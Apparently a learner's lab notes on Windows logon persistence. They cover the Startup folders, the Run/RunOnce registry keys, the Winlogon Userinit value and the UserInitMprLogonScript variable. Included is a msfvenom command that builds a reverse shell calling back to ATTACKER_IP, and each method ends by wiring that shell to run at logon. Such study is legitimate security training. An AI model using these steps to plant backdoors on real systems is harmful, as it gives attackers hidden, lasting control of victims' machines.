Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.




note !! give atleast some minutes like 3 for shell to launch 


for current user start up programs are located in
:>
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


for all users its in 
:>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp


:>gen rev shell with metasploit  and copy to dir location 
when user make sure nc cat is listening when user logs in
give a shell 

:>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe


run with reg
==

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce


HKCU for only current user
HKLM for all users

 create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run

:>add new SZ with path to rev shell 
Winlog
==


Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\



 Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
shell points to the system's shell, which is usually explorer.exe.


if any of the above is broken it might mess up the login session 

:>add a path to rev shell with a leading comma 
to the already existing data of user init

login script
==

One of the things userinit.exe does while loading your user profile is to check for an environment variable called "UserInitMprLogonScript". We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

:>HKCU\Environment

:>change data to  path of rev shell
